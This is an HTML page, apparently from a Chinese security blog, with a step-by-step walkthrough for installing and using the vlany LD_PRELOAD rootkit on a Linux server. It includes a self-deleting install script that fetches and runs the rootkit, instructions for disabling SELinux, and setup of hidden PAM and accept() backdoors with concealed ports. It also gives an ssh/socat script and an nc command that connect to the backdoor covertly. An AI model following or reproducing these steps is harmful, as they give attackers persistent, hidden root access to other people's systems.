@@ -1,0 +1,1287 @@
+<!doctype html>
+
+
+  
+
+
+<html class="theme-next muse use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+  
+  
+  
+  
+
+  
+
+  
+    
+
+    
+  
+
+  
+    
+
+    
+  
+
+  
+    
+
+    
+  
+
+  
+    
+
+    
+  
+
+  
+    
+    
+    <link href="//fonts.googleapis.com/css?family=Kalam:300,300italic,400,400italic,700,700italicUbuntu:300,300italic,400,400italic,700,700italicSatisfy:300,300italic,400,400italic,700,700italicInconsolata:300,300italic,400,400italic,700,700italic&subset=latin,latin-ext" rel="stylesheet" type="text/css">
+  
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.1" rel="stylesheet" type="text/css" />
+
+
+  <meta name="keywords" content="Rookit," />
+
+
+
+
+
+
+
+
+  <link rel="shortcut icon" type="image/x-icon" href="/favicon.ico?v=5.1.1" />
+
+
+
+
+
+
+<meta name="description" content="``                                +s/`                   `..---:/:-`  -oys`     ...`                  :soo++++/:sy:  /hy`   -ossyyyo:`                `+o-``     `:hh/ +">
+<meta name="keywords" content="Rookit">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Linux动态链接库预加载型后门，Vlany安装及分析">
+<meta property="og:url" content="https://kionf.com/2018/10/25/rookit-vlany/index.html">
+<meta property="og:site_name" content="Kionf">
+<meta property="og:description" content="``                                +s/`                   `..---:/:-`  -oys`     ...`                  :soo++++/:sy:  /hy`   -ossyyyo:`                `+o-``     `:hh/ +">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-01.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-02.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-03.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-04.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-05.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-06.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-07.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-08.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-09.jpg">
+<meta property="og:image" content="https://kionf.com/article_images/vlany-10.jpg">
+<meta property="og:updated_time" content="2018-10-31T08:55:10.333Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="Linux动态链接库预加载型后门，Vlany安装及分析">
+<meta name="twitter:description" content="``                                +s/`                   `..---:/:-`  -oys`     ...`                  :soo++++/:sy:  /hy`   -ossyyyo:`                `+o-``     `:hh/ +">
+<meta name="twitter:image" content="https://kionf.com/article_images/vlany-01.jpg">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Muse',
+    sidebar: {"position":"left","display":"post","offset":12,"offset_float":0,"b2t":false,"scrollpercent":false},
+    fancybox: true,
+    motion: true,
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://kionf.com/2018/10/25/rookit-vlany/"/>
+
+
+
+
+
+  <title>Linux动态链接库预加载型后门，Vlany安装及分析 | Kionf</title>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+
+
+
+
+<script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+            (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+          m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','https://www.google-analytics.com/analytics.js','ga');
+  ga('create', 'UA-80809114-1', 'auto');
+  ga('send', 'pageview');
+</script>
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail ">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title title motto-shake" data-text="Kionf"></span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description"></h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="https://kionf.com/2018/10/25/rookit-vlany/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Kionf">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Kionf">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">Linux动态链接库预加载型后门，Vlany安装及分析</h2>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-10-25T00:00:00+08:00">
+                2018-10-25
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Sec/" itemprop="url" rel="index">
+                    <span itemprop="name">Sec</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Sec/Rookit/" itemprop="url" rel="index">
+                    <span itemprop="name">Rookit</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2018/10/25/rookit-vlany/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2018/10/25/rookit-vlany/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o"></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <figure class="highlight plain"><div class="figcode"><div class="code"><pre><div class="line">                                ``</div><div class="line">                                +s/`</div><div class="line">                   `..---:/:-`  -oys`     ...`</div><div class="line">                  :soo++++/:sy:  /hy`   -ossyyyo:`</div><div class="line">                `+o-``     `:hh/ +hy   /sysydddddo. `-/++oooooss+:-`</div><div class="line">               `shs++os+/:.`.smh:odh:oydddhddhdmmdy+hds+o+-..&apos;&apos;&apos;.-:--`</div><div class="line">             .+hdho-oddmmmmds+mmhommdmmNmNmhhmNNmdmmmdyosyso/-.`</div><div class="line">         `-+yhho-`-ydo-+sdmNMNNNNmNmNmmNNdmdyhmdmNNmms-``.-/+osyo:`</div><div class="line">       `/ydy+-`  `ydy`  `.:+ydmdmNNsmNmhmmNmmdhmNNmh/`       `.-:+s:</div><div class="line">      :yo:-`     +md:       ``.-ysddmddhNNmmNNNNNNmhyso+-.`       -++.</div><div class="line">    `+h+`       -dd/            :o/oooydhdyhmNNNmmNNdhyssyhs.       -+/`</div><div class="line">   -so.        .hmo`            `s`   -os:``-////smm:&apos;&apos;&apos;&apos;.+hh+.       `::`</div><div class="line">  -s:          smy.              .`   +/`        smh.      .+ddo.       ``</div><div class="line">`:/`          -dh:                    `         `hNy         .odh/</div><div class="line">-.            +y.                               .dNo           -/h/</div><div class="line">             .yo`                               -mN/             od.</div><div class="line">             /y-                                /mm-             .hs</div><div class="line">            `s+                                 +dy`              -d-</div><div class="line">            .s-                                `oh-                +/</div><div class="line">            :+`                                :d+                 .+</div><div class="line">            /.                                `yy`                  :</div><div class="line">           `+                                 +h-</div><div class="line">           --                                .h/</div><div class="line">                                             +/</div><div class="line">                                            -+</div><div class="line">                                           `o`</div><div class="line">                                            `</div></pre></div></div></figure>
+<blockquote class="blockquote-center"><p>此工具<strong><a href="https://github.com/mempodippy/vlany" title="vlany Github" target="_blank" rel="noopener">vlany</a></strong>通过<code>LD_PRELOAD</code>环境变量和/etc/ld.so.preload的配置文件来重写系统调用函数，加载攻击者自定义的恶意函数。类似于在<code>/etc/profile</code> 中添加<code>alias</code>别名’重写命令的感觉</p>
+</blockquote>
+<a id="more"></a>
+<h1 id="0x00-工具原理分析"><a href="#0x00-工具原理分析" class="headerlink" title="0x00 工具原理分析"></a>0x00 工具原理分析</h1><p>  预加载动态连接库这种利用技术，在早些年国外就已经有过利用相关的文章。只是近年国内恶意软件利用频繁被各大安全厂商捕获分析，也就渐渐公布在大众眼前。对于这种利用的大概原理，已有文章做了深入分析，这里就不重复造轮。文章地址：<a href="http://www.freebuf.com/column/162604.html" target="_blank" rel="noopener">警惕利用Linux预加载型恶意动态链接库的后门</a></p>
+<hr>
+
+<h1 id="0x01-下载项目"><a href="#0x01-下载项目" class="headerlink" title="0x01 下载项目"></a>0x01 下载项目</h1><figure class="highlight bash"><figcaption><span class="caption">实验环境</span></figcaption><div class="figcode"><div class="code"><pre><div class="line">CentOS-6.9  内核：2.6.32-696.el6.x86_64    架构：x86_64</div><div class="line marked">Kali-2018   内核：4.17.0-kali1-amd64       架构：x86_64 <span class="comment">#不支持</span></div></pre></div></div></figure>
+<p><br></p>
+<p>编辑文件<code>quick_install.sh</code>：</p>
+<figure class="highlight shell"><figcaption><span class="caption">后门安装脚本</span><a href="https://github.com/mempodippy/vlany" target="_blank">项目地址</a></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/sh</span></div><div class="line"></div><div class="line">[ $(id -u) != 0 ] &amp;&amp; &#123; echo "Not root. Exiting."; exit; &#125;</div><div class="line"></div><div class="line">WORKING_DIR="/tmp/.$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1)"</div><div class="line">ARCHIVE_NAME="$(cat /dev/urandom | tr -dc 'a-zA-Z0-9' | fold -w 8 | head -n 1).tar.gz"</div><div class="line"></div><div class="line">mkdir $WORKING_DIR &amp;&amp; cd $WORKING_DIR</div><div class="line">wget https://github.com/mempodippy/vlany/archive/master.tar.gz -O $ARCHIVE_NAME</div><div class="line">tar xvpfz $ARCHIVE_NAME &amp;&amp; rm $ARCHIVE_NAME</div><div class="line">cd vlany-master</div><div class="line">chmod +x install.sh</div><div class="line marked">./install.sh</div><div class="line"></div><div class="line">rm -rf $WORKING_DIR</div><div class="line"><span class="meta">#</span><span class="bash">下载完后删除项目</span></div><div class="line">rm -f $0</div><div class="line"><span class="meta">#</span><span class="bash">执行后删除自身脚本</span></div></pre></div></div></figure>
+<p><br></p>
+<h1 id="0x02-编译安装"><a href="#0x02-编译安装" class="headerlink" title="0x02 编译安装"></a>0x02 编译安装</h1><div class="note danger"><p><code>quick_install.sh</code>下载项目后解压调用<code>install.sh</code>脚本，首先会检测SElinux是否关闭如果没关闭，脚本会关闭SElinux。此时需要重启机器。</p>
+</div>
+<p>实际应用中，如果不想重启机器，可以单独下载项目执行命令<code>wget https://github.com/mempodippy/vlany/archive/master.tar.gz &amp;&amp; tar xvpfz master.tar.gz &amp;&amp; cd vlany-master</code><br>重新建立终端，然后输入<code>setenforce 0</code>，再更改<code>install.sh</code>脚本</p>
+<figure class="highlight shell"><figcaption><span class="caption">install</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></div><div class="code"><pre><div class="line">    if [[ $(sestatus -v | head -n 1) == *"enabled"* ]]; then</div><div class="line">        echo "SELinux is still enabled. Reboot."</div><div class="line diff-deletion">        exit # 注释此行</div><div class="line">    else</div><div class="line">        echo "SELinux is disabled."</div><div class="line">    fi</div></pre></div></div></figure>
+<p>检验完SElinux，程序出现提示框选在grub配置位置，来确认当机器重启后 后门依然生效。根据机器实际情况填写，默认<code>/etc/grub.conf</code></p>
+<figure class="highlight bash"><div class="figcode"><div class="code"><pre><div class="line">Enter location of bootloader config file (<span class="keyword">if</span> grub2, config file is /boot/grub/grub.cfg) [/etc/grub.conf]:</div></pre></div></div></figure>
+<p>然后一路回车，等待<code>gcc</code>等依赖安装完成，出现如下界面。选择是编译并安装，还是只编译，我们这里选在<code>YES</code></p>
+<p><img src="https://kionf.com/article_images/vlany-01.jpg" alt="vlany-01"></p>
+<h2 id="1-配置PAM后门"><a href="#1-配置PAM后门" class="headerlink" title="1. 配置PAM后门"></a>1. 配置PAM后门</h2><p>再一路回车，到如下界面。设置通过<code>ssh</code>连接的PAM用户名，<strong>记住此后门用户名</strong></p>
+<p><img src="https://kionf.com/article_images/vlany-02.jpg" alt="vlany-02"></p>
+<p>然后设置PAM密码，这里输入密码不会回显任何东西，继续输入就ok</p>
+<p><img src="https://kionf.com/article_images/vlany-03.jpg" alt="vlany-03"></p>
+<p>设置PAM端口，也是需要隐藏的端口</p>
+<p><img src="https://kionf.com/article_images/vlany-04.jpg" alt="vlany-04"></p>
+<h2 id="2-配置accept-后门"><a href="#2-配置accept-后门" class="headerlink" title="2. 配置accept()后门"></a>2. 配置<code>accept()</code>后门</h2><p>设置连接是否使用<code>SSL</code>加密，这测试选择<code>NO</code></p>
+<p><img src="https://kionf.com/article_images/vlany-05.jpg" alt="vlany-05"></p>
+<p>设置<code>accept()</code>后门密码，一样没有回显。</p>
+<p><img src="https://kionf.com/article_images/vlany-06.jpg" alt="vlany-06"></p>
+<p>设置<code>accept()</code>后门隐藏端口</p>
+<p><img src="https://kionf.com/article_images/vlany-07.jpg" alt="vlany-07"></p>
+<p>设置<code>execve()</code>密码，然后再再再一路回车，出现如下界面，是否删除编译项目的路径。</p>
+<p><img src="https://kionf.com/article_images/vlany-08.jpg" alt="vlany-08"></p>
+<p>完成后，脚本会提示是否安装做着新研究的<code>snodew</code>后门这里选择<code>NO</code></p>
+<figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">Installation has finished. Would you like to setup the experimental snodew root reverse shell backdoor? (YES/NO) (<span class="keyword">case</span>-sensitive) [YES]:</div></pre></div></div></figure>
+<h2 id="3-连接信息"><a href="#3-连接信息" class="headerlink" title="3. 连接信息"></a>3. 连接信息</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#ssh连接PAM用户名</span></div><div class="line">PAM backdoor username: ***REMOVED***</div><div class="line"></div><div class="line"><span class="comment">#PAM端口</span></div><div class="line">Hidden PAM port: 4397</div><div class="line"></div><div class="line"><span class="comment">#accept后门随机端口号</span></div><div class="line">accept backdoor low port: 271</div><div class="line">accept backdoor high port: 274</div><div class="line"></div><div class="line"><span class="comment">#后门位置</span></div><div class="line">Hidden directory: /lib/libc.so.***REMOVED***.14</div><div class="line"></div><div class="line"><span class="comment">#变量</span></div><div class="line">Environment variable: UVRTBKAYCLWI</div></pre></div></div></figure>
+<p>全部配置完成后，会呈现出如上连接信息</p>
+<hr>
+
+<h1 id="0x03-连接后门"><a href="#0x03-连接后门" class="headerlink" title="0x03 连接后门"></a>0x03 连接后门</h1><h2 id="1-PAM后门连接"><a href="#1-PAM后门连接" class="headerlink" title="1. PAM后门连接"></a>1. PAM后门连接</h2><figure class="highlight shell"><figcaption><span class="caption">ssh</span><span class="suffix">.sh</span></figcaption><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></div><div class="code"><pre><div class="line"><span class="meta">#</span><span class="bash">!/bin/bash</span></div><div class="line"></div><div class="line"><span class="meta">#</span><span class="bash"> Small bash script designed to allow easy connection to hidden PAM backdoors.</span></div><div class="line"><span class="meta">#</span><span class="bash"> Gets copied to your hidden directory <span class="keyword">in</span> <span class="keyword">case</span> you want to route through more</span></div><div class="line"><span class="meta">#</span><span class="bash"> than one rooted box. :)</span></div><div class="line"></div><div class="line">usage () &#123; echo "$0 &lt;PAM backdoor username&gt; &lt;host&gt; &lt;hidden PAM port&gt;"; exit; &#125;</div><div class="line"></div><div class="line">[ -z $1 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ -z $2 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ -z $3 ] &amp;&amp; &#123; usage; &#125;</div><div class="line">[ ! -f /usr/bin/socat ] &amp;&amp; &#123; echo "socat isn't installed. exiting."; exit; &#125;</div><div class="line"></div><div class="line">echo "Connecting to PAM backdoor @ host $2 on hidden PAM port $3 as $1"</div><div class="line">read -p "Press enter to continue"</div><div class="line">ssh -o ProxyCommand="socat - tcp4-connect:$2:22,bind=:$3" $2 -l "$1"</div></pre></div></div></figure>
+<p>使用其他机器连接后门，编辑文件<code>ssh.sh</code>。</p>
+<figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div></pre></div><div class="code"><pre><div class="line">sh ssh.sh ***REMOVED*** 192.168.10.35 4397</div></pre></div></div></figure>
+<p>连接成功</p>
+<p><img src="https://kionf.com/article_images/vlany-09.jpg" alt="vlany-09"></p>
+<p>在被攻击端查看是否有异常连接，完全隐藏没有显示出任何连接信息，并且查看<code>/etc/passwd</code>文件，没有我们所使用的<code>***REMOVED***</code>用户</p>
+<p><img src="https://kionf.com/article_images/vlany-10.jpg" alt="vlany-10"></p>
+<div class="note danger"><p>注意：<strong>如果不使用<code>ssh.sh</code>脚本连接pam后门，直接使用ssh连接。被攻击端会查看到ssh连接信息</strong></p>
+</div>
+<h2 id="2-accept-后门连接"><a href="#2-accept-后门连接" class="headerlink" title="2. accept()后门连接"></a>2. accept()后门连接</h2><figure class="highlight bash"><div class="figcode"><div class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></div><div class="code"><pre><div class="line"><span class="comment">#accept backdoor low port: 271</span></div><div class="line"><span class="comment">#accept backdoor high port: 274</span></div><div class="line"><span class="comment"># -p 指定 271-274 范围内端口</span></div><div class="line">nc 192.168.10.35 22 -p 271</div><div class="line"><span class="comment">#输入设定的accept密码后回车</span></div><div class="line">***REMOVED***</div><div class="line"> [+] shell dropped</div></pre></div></div></figure>
+<p><strong>accept()后门在实际测试中没有成功，由于内核版本等问题。</strong></p>
+<blockquote>
+<p>参考：<br>  <a href="https://raw.githubusercontent.com/mempodippy/vlany/master/README_old" target="_blank" rel="noopener">vlany_readme_file</a><br>  <a href="http://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/" target="_blank" rel="noopener">系统函数</a><br>  <a href="https://github.com/mempodippy/vlany/wiki/Features" target="_blank" rel="noopener">vlany_wiki</a></p>
+</blockquote>
+<p>👿</p>
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+
+      
+    </div>
+
+    <div>
+      
+        
+  <ul class="post-copyright">
+    <li class="post-copyright-author">
+      <strong>本文作者：</strong>
+      Kionf
+    </li>
+    <li class="post-copyright-link">
+      <strong>本文链接：</strong>
+      <a href="https://kionf.com/2018/10/25/rookit-vlany/" title="Linux动态链接库预加载型后门，Vlany安装及分析">https://kionf.com/2018/10/25/rookit-vlany/</a>
+    </li>
+    <li class="post-copyright-license">
+      <strong>版权声明： </strong>
+      本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/3.0/" rel="external nofollow" target="_blank">CC BY-NC-SA 3.0</a> 许可协议。转载请注明出处！
+    </li>
+  </ul>
+
+
+      
+    </div>
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/Rookit/" rel="tag"># Rookit</a>
+          
+        </div>
+      
+
+      
+        
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2018/09/13/metasploit-presistence/" rel="next" title="关于 meterpreter 持久化问题研究">
+                <i class="fa fa-chevron-left"></i> 关于 meterpreter 持久化问题研究
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+  <div class="comments" id="comments">
+    
+      <div id="disqus_thread">
+        <noscript>
+          Please enable JavaScript to view the
+          <a href="https://disqus.com/?ref_noscript">comments powered by Disqus.</a>
+        </noscript>
+      </div>
+    
+  </div>
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap" >
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <section class="site-overview sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+          <img class="site-author-image" itemprop="image"
+               src="/images/avatar.png"
+               alt="Kionf" />
+          <p class="site-author-name" itemprop="name">Kionf</p>
+           
+              <p class="site-description motion-element" itemprop="description"></p>
+           
+        </div>
+        <nav class="site-state motion-element">
+
+          
+            <div class="site-state-item site-state-posts">
+              <a href="/archives">
+                <span class="site-state-item-count">35</span>
+                <span class="site-state-item-name">日志</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-categories">
+              <a href="/categories/index.html">
+                <span class="site-state-item-count">32</span>
+                <span class="site-state-item-name">分类</span>
+              </a>
+            </div>
+          
+
+          
+            
+            
+            <div class="site-state-item site-state-tags">
+              
+                <span class="site-state-item-count">21</span>
+                <span class="site-state-item-name">标签</span>
+              
+            </div>
+          
+
+        </nav>
+
+        
+
+        <div class="links-of-author motion-element">
+          
+            
+              <span class="links-of-author-item">
+                <a href="https://github.com/kalivim" target="_blank" title="GitHub">
+                  
+                    <i class="fa fa-fw fa-github"></i>
+                  
+                  GitHub
+                </a>
+              </span>
+            
+          
+        </div>
+
+        
+        
+
+        
+        
+          <div class="links-of-blogroll motion-element links-of-blogroll-inline">
+            <div class="links-of-blogroll-title">
+              <i class="fa  fa-fw fa-globe"></i>
+              Links
+            </div>
+            <ul class="links-of-blogroll-list">
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://www.freebuf.com/" title="FREEBUF" target="_blank">FREEBUF</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://paper.seebug.org/" title="SecPaper" target="_blank">SecPaper</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="https://kionf.com/edit/" title="MarkDown" target="_blank">MarkDown</a>
+                </li>
+              
+            </ul>
+          </div>
+        
+
+        
+
+
+      </section>
+
+      
+      <!--noindex-->
+        <section class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+              
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#0x00-工具原理分析"><span class="nav-text">0x00 工具原理分析</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x01-下载项目"><span class="nav-text">0x01 下载项目</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x02-编译安装"><span class="nav-text">0x02 编译安装</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-配置PAM后门"><span class="nav-text">1. 配置PAM后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-配置accept-后门"><span class="nav-text">2. 配置accept()后门</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#3-连接信息"><span class="nav-text">3. 连接信息</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#0x03-连接后门"><span class="nav-text">0x03 连接后门</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-PAM后门连接"><span class="nav-text">1. PAM后门连接</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-accept-后门连接"><span class="nav-text">2. accept()后门连接</span></a></li></ol></li></ol></div>
+            
+
+          </div>
+        </section>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright" >
+  
+  &copy;  2014 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love" id="heart">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Kionf</span>
+</div>
+
+
+<div class="powered-by">
+  什么样的人才能和时间成为朋友？
+</div>
+
+<div class="theme-info">
+  止于 -
+    源
+  </a>
+</div>
+
+
+        
+<div class="busuanzi-count">
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-user"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-eye"></i>
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
